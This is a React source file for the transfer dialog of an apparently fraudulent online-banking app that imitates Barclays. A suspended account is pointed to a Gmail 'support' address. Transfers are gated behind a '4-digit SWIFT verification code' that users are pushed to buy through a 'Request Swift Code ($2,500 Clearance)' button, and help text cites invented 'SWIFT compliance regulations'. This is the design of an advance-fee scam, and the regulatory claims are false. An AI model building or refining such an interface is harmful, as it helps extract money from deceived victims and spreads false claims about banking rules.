import React, { useState } from 'react';
import { 
  X, 
  Send, 
  Globe, 
  Building2, 
  User, 
  Hash, 
  KeyRound, 
  AlertCircle, 
  CheckCircle2, 
  ShieldAlert, 
  DollarSign, 
  Info,
  ArrowRight,
  ChevronDown,
  Mail
} from 'lucide-react';
import { UserProfile, FinancialSettings, BankTransaction } from '../types';
import { SUPPORTED_COUNTRIES } from '../lib/banksData';
import { store } from '../lib/store';
import { BrandLogo } from './BrandLogo';

interface TransferModalProps {
  isOpen: boolean;
  onClose: () => void;
  currentUser: UserProfile;
  settings: FinancialSettings;
  onTransferSuccess: (transaction: BankTransaction) => void;
  onRequestSwiftCode?: () => void;
}

export const TransferModal: React.FC<TransferModalProps> = ({
  isOpen,
  onClose,
  currentUser,
  settings,
  onTransferSuccess,
  onRequestSwiftCode
}) => {
  const [selectedCountryName, setSelectedCountryName] = useState('United Kingdom');
  const [recipientBank, setRecipientBank] = useState('Barclays Bank UK');
  const [recipientName, setRecipientName] = useState('');
  const [recipientAccountNumber, setRecipientAccountNumber] = useState('');
  const [swiftCode, setSwiftCode] = useState('BARCGB22');
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showCodeHelp, setShowCodeHelp] = useState(false);

  if (!isOpen) return null;

  // Account Restriction System (Requirement 2)
  if (currentUser.status === 'suspended') {
    const supportEmail = settings.supportEmail || 'newzelebarclaysupport@gmail.com';
    const mailtoSubject = encodeURIComponent(`Account Restriction Inquiry - ${currentUser.fullName} ${currentUser.surname} (${currentUser.accountNumber})`);
    const mailtoBody = encodeURIComponent(`Hello, I am ${currentUser.fullName} ${currentUser.surname}. I am writing regarding my account (${currentUser.accountNumber}) which has been restricted...`);
    const mailtoUrl = `mailto:${supportEmail}?subject=${mailtoSubject}&body=${mailtoBody}`;

    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/85 backdrop-blur-md animate-in fade-in duration-200">
        <div className="relative w-full max-w-md bg-[#00172e] border border-rose-500/50 rounded-3xl shadow-2xl p-6 sm:p-8 text-white text-center space-y-5">
          <button onClick={onClose} className="absolute right-4 top-4 p-1.5 rounded-lg text-slate-400 hover:text-white">
            <X className="w-5 h-5" />
          </button>
          
          <div className="w-16 h-16 mx-auto rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400">
            <ShieldAlert className="w-8 h-8" />
          </div>

          <div>
            <span className="text-[10px] font-bold uppercase tracking-wider text-rose-400 block">
              Security Compliance Alert
            </span>
            <h3 className="text-lg font-black text-white mt-1">Account Suspension Active</h3>
          </div>

          <div className="p-4 rounded-2xl bg-rose-950/40 border border-rose-800/50 text-xs text-rose-200 leading-relaxed font-medium">
            Your account has been suspended. Kindly contact support for more assistance.
          </div>

          <div className="flex flex-col sm:flex-row gap-3 pt-2">
            <button
              onClick={onClose}
              className="w-full sm:w-1/2 py-2.5 rounded-xl bg-[#002244] hover:bg-[#002f5c] text-xs font-semibold text-slate-300 transition-colors"
            >
              Close
            </button>
            <a
              href={mailtoUrl}
              className="w-full sm:w-1/2 py-2.5 rounded-xl bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-400 hover:to-rose-500 text-xs font-bold text-white flex items-center justify-center gap-2 shadow-lg shadow-rose-500/20 transition-all"
            >
              <Mail className="w-4 h-4" />
              <span>Contact Support</span>
            </a>
          </div>
        </div>
      </div>
    );
  }

  const selectedCountryObj = SUPPORTED_COUNTRIES.find(c => c.name === selectedCountryName) || SUPPORTED_COUNTRIES[0];
  const availableBanks = selectedCountryObj.banks;

  const handleCountryChange = (countryName: string) => {
    setSelectedCountryName(countryName);
    const found = SUPPORTED_COUNTRIES.find(c => c.name === countryName);
    if (found && found.banks.length > 0) {
      setRecipientBank(found.banks[0]);
    }
  };

  const handleTransferSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');

    const numAmount = parseFloat(amount);
    if (!numAmount || numAmount <= 0) {
      setErrorMessage('Please enter a valid transfer amount.');
      return;
    }

    if (!recipientName.trim()) {
      setErrorMessage('Please specify the recipient full legal name.');
      return;
    }

    if (!recipientAccountNumber.trim()) {
      setErrorMessage('Please specify the recipient account number or IBAN.');
      return;
    }

    if (!swiftCode.trim()) {
      setErrorMessage('Please specify the destination SWIFT / BIC Code.');
      return;
    }

    // SWIFT 4-digit code verification check per Requirement 3
    if (settings.requireSwiftCode) {
      if (!currentUser.swiftVerificationCode || verificationCode.trim() !== currentUser.swiftVerificationCode) {
        setErrorMessage('Invalid credentials. Kindly request for your Swift Code.');
        return;
      }
    }

    setIsSubmitting(true);
    try {
      const result = await store.initiateTransfer({
        userId: currentUser.uid,
        amount: numAmount,
        recipientName,
        recipientAccountNumber,
        recipientBank,
        recipientCountry: selectedCountryName,
        swiftCode,
        verificationCode,
        description
      });

      if (result.error || !result.transaction) {
        setErrorMessage(result.error || 'Failed to submit transfer.');
      } else {
        onTransferSuccess(result.transaction);
        onClose();
      }
    } catch (err: any) {
      setErrorMessage(err.message || 'Transfer failed.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const dailyLimit = currentUser.tier === 'Tier 1' 
    ? settings.tier1DailyLimit 
    : currentUser.tier === 'Tier 2' 
    ? settings.tier2DailyLimit 
    : settings.tier3DailyLimit;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-lg bg-[#00172e] border border-[#003866] rounded-2xl shadow-2xl overflow-hidden text-white">
        
        {/* Header */}
        <div className="px-6 py-4 border-b border-[#002b52] flex items-center justify-between">
          <div className="flex items-center gap-3">
            <BrandLogo variant="horizontal" size="sm" />
            <div>
              <span className="text-[10px] font-bold uppercase tracking-wider text-cyan-400">
                International & Domestic Wire
              </span>
              <h3 className="text-base font-extrabold text-white">New Bank Transfer</h3>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-[#002244] transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Balance & Limit Info Bar */}
        <div className="px-6 py-2.5 bg-[#001224] border-b border-[#002244] flex items-center justify-between text-xs">
          <div>
            <span className="text-slate-400">Available Balance:</span>
            <span className="ml-1.5 font-bold font-mono text-emerald-400">
              ${currentUser.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
            </span>
          </div>
          <div>
            <span className="text-slate-400">{currentUser.tier} Daily Limit:</span>
            <span className="ml-1.5 font-bold font-mono text-cyan-400">
              ${dailyLimit.toLocaleString('en-US')}
            </span>
          </div>
        </div>

        {/* Transfer Form */}
        <form onSubmit={handleTransferSubmit} className="p-6 max-h-[75vh] overflow-y-auto space-y-4">
          {errorMessage && (
            <div className="p-3.5 rounded-xl bg-rose-950/70 border border-rose-800 text-rose-200 text-xs flex flex-col gap-2">
              <div className="flex items-start gap-2.5">
                <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                <div>
                  <p className="font-semibold">Verification Alert</p>
                  <p className="text-[11px] mt-0.5 leading-relaxed">{errorMessage}</p>
                </div>
              </div>

              {errorMessage.includes('request for your Swift Code') && (
                <button
                  type="button"
                  onClick={() => {
                    onClose();
                    onRequestSwiftCode?.();
                  }}
                  className="mt-1 w-full py-2 px-3 rounded-lg bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-bold text-xs flex items-center justify-center gap-1.5 shadow"
                >
                  <span>Request Swift Code ($2,500 Clearance)</span>
                  <ArrowRight className="w-3.5 h-3.5" />
                </button>
              )}
            </div>
          )}

          {/* Destination Country Selection - Fixed visual overlap */}
          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1 flex items-center justify-between">
              <span className="flex items-center gap-1.5">
                <Globe className="w-3.5 h-3.5 text-cyan-400" />
                <span>Destination Country <span className="text-cyan-400">*</span></span>
              </span>
              <span className="text-[10px] text-slate-400">30+ Countries Supported</span>
            </label>
            <div className="relative">
              <select
                value={selectedCountryName}
                onChange={(e) => handleCountryChange(e.target.value)}
                className="w-full bg-[#002040] border border-[#003866] rounded-xl px-3.5 py-2.5 text-xs text-white appearance-none cursor-pointer focus:outline-none focus:border-cyan-400 pr-9"
              >
                {SUPPORTED_COUNTRIES.map(c => (
                  <option key={c.code} value={c.name} className="bg-[#00172e] text-white">
                    {c.flag} {c.name} ({c.currency})
                  </option>
                ))}
              </select>
              <ChevronDown className="absolute right-3 top-3 w-4 h-4 text-slate-400 pointer-events-none" />
            </div>
          </div>

          {/* Dynamic Recipient Bank Selection - Fixed visual overlap */}
          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1 flex items-center gap-1.5">
              <Building2 className="w-3.5 h-3.5 text-cyan-400" />
              <span>Supported Bank in {selectedCountryName} <span className="text-cyan-400">*</span></span>
            </label>
            <div className="relative">
              <select
                value={recipientBank}
                onChange={(e) => setRecipientBank(e.target.value)}
                className="w-full bg-[#002040] border border-[#003866] rounded-xl px-3.5 py-2.5 text-xs text-white appearance-none cursor-pointer focus:outline-none focus:border-cyan-400 pr-9"
              >
                {availableBanks.map(bank => (
                  <option key={bank} value={bank} className="bg-[#00172e] text-white">
                    {bank}
                  </option>
                ))}
              </select>
              <ChevronDown className="absolute right-3 top-3 w-4 h-4 text-slate-400 pointer-events-none" />
            </div>
            <p className="text-[10px] text-slate-400 mt-1">
              Supported commercial banks for instant automated clearing.
            </p>
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1">
                Recipient Full Name *
              </label>
              <div className="relative">
                <User className="absolute left-3 top-2.5 w-4 h-4 text-slate-400" />
                <input
                  type="text"
                  value={recipientName}
                  onChange={(e) => setRecipientName(e.target.value)}
                  placeholder="e.g. Jean Dupont"
                  className="w-full bg-[#002040] border border-[#003866] rounded-lg pl-9 pr-3 py-2 text-xs text-white placeholder-slate-400 focus:outline-none focus:border-cyan-400"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold text-slate-300 mb-1">
                SWIFT / BIC Code *
              </label>
              <input
                type="text"
                value={swiftCode}
                onChange={(e) => setSwiftCode(e.target.value.toUpperCase())}
                placeholder="e.g. BARCGB22"
                className="w-full bg-[#002040] border border-[#003866] rounded-lg px-3 py-2 text-xs text-white font-mono uppercase focus:outline-none focus:border-cyan-400"
                required
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1">
              Recipient Account Number or IBAN *
            </label>
            <div className="relative">
              <Hash className="absolute left-3 top-2.5 w-4 h-4 text-slate-400" />
              <input
                type="text"
                value={recipientAccountNumber}
                onChange={(e) => setRecipientAccountNumber(e.target.value)}
                placeholder="e.g. GB29 BARC 2000 0084 9201 84 or Account #"
                className="w-full bg-[#002040] border border-[#003866] rounded-lg pl-9 pr-3 py-2 text-xs text-white placeholder-slate-400 font-mono focus:outline-none focus:border-cyan-400"
                required
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1">
              Transfer Amount ($ USD) *
            </label>
            <div className="relative">
              <DollarSign className="absolute left-3 top-2.5 w-4 h-4 text-emerald-400" />
              <input
                type="number"
                step="0.01"
                min="1"
                max={dailyLimit}
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="w-full bg-[#002040] border border-[#003866] rounded-lg pl-9 pr-3 py-2 text-sm font-bold font-mono text-emerald-400 placeholder-slate-400 focus:outline-none focus:border-cyan-400"
                required
              />
            </div>
            <p className="text-[10px] text-slate-400 mt-1">
              Note: Transfer will be submitted as <strong className="text-amber-400">Pending</strong>. Per bank policy, funds are reserved and will be debited upon admin processing.
            </p>
          </div>

          {/* SWIFT 4-Digit Verification Code Section (Gated Requirement 3) */}
          <div className="p-3.5 rounded-xl bg-[#001f3d] border border-cyan-500/30 space-y-2">
            <div className="flex items-center justify-between">
              <label className="text-xs font-bold text-white flex items-center gap-1.5">
                <KeyRound className="w-3.5 h-3.5 text-amber-400" />
                <span>4-Digit SWIFT Verification Code *</span>
              </label>
              <button
                type="button"
                onClick={() => setShowCodeHelp(!showCodeHelp)}
                className="text-[10px] text-cyan-400 hover:underline flex items-center gap-0.5"
              >
                <Info className="w-3 h-3" />
                <span>What is this?</span>
              </button>
            </div>

            <div className="relative">
              <input
                type="password"
                maxLength={4}
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ''))}
                placeholder="Enter 4-digit code"
                className="w-full bg-[#001326] border border-[#003366] rounded-lg px-3 py-2 text-xs text-white placeholder-slate-400 font-mono tracking-widest text-center text-sm font-bold focus:outline-none focus:border-cyan-400"
                required
              />
            </div>

            {currentUser.swiftVerificationCode ? (
              <p className="text-[10px] text-emerald-400 flex items-center gap-1">
                <CheckCircle2 className="w-3 h-3 text-emerald-400" />
                <span>Authorized SWIFT clearance active for your account.</span>
              </p>
            ) : (
              <div className="flex items-center justify-between text-[10px] text-slate-300">
                <span>No SWIFT code assigned yet.</span>
                <button
                  type="button"
                  onClick={() => {
                    onClose();
                    onRequestSwiftCode?.();
                  }}
                  className="text-cyan-400 hover:underline font-bold"
                >
                  Request Swift Code ($2,500)
                </button>
              </div>
            )}

            {showCodeHelp && (
              <p className="text-[10px] text-slate-300 bg-[#001830] p-2 rounded border border-[#00284d] leading-relaxed">
                As required by international SWIFT compliance regulations, high-value transfers must be confirmed with your 4-digit security code before dispatch to the central clearing house.
              </p>
            )}
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-1">
              Payment Remarks / Purpose (Optional)
            </label>
            <input
              type="text"
              value={description}
              onChange={(e) => setDescription(e.target.value)}
              placeholder="e.g. Invoice settlement or family support"
              className="w-full bg-[#002040] border border-[#003866] rounded-lg px-3 py-2 text-xs text-white placeholder-slate-400 focus:outline-none focus:border-cyan-400"
            />
          </div>

          {/* Transparent Fee & Settlement Disclosure */}
          <div className="p-3.5 rounded-xl bg-[#00172e] border border-[#00284d] space-y-1.5 text-xs">
            <div className="flex items-center justify-between text-slate-300">
              <span>Transfer Subtotal:</span>
              <span className="font-mono font-bold text-white">${(parseFloat(amount) || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span>
            </div>
            <div className="flex items-center justify-between text-slate-300">
              <span>Network / Clearing Fee:</span>
              <span className="font-mono text-emerald-400 font-bold">$0.00 (Free Standard Clearance)</span>
            </div>
            <div className="border-t border-[#002447] pt-1.5 flex items-center justify-between text-xs font-bold">
              <span className="text-white">Total Amount to Debit:</span>
              <span className="font-mono text-emerald-400 font-extrabold text-sm">
                ${(parseFloat(amount) || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
              </span>
            </div>
            <p className="text-[10px] text-slate-400 pt-0.5">
              Estimated processing & settlement: Instant to 24 business hours. Fully transparent with zero hidden deductions.
            </p>
          </div>

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-extrabold text-xs tracking-wider uppercase shadow-lg shadow-cyan-500/20 flex items-center justify-center gap-2 transition-all disabled:opacity-50 cursor-pointer"
          >
            {isSubmitting ? 'Transmitting to SWIFT Clearing...' : 'Dispatch Transfer (Generate Receipt)'}
            <ArrowRight className="w-4 h-4" />
          </button>
        </form>
      </div>
    </div>
  );
};
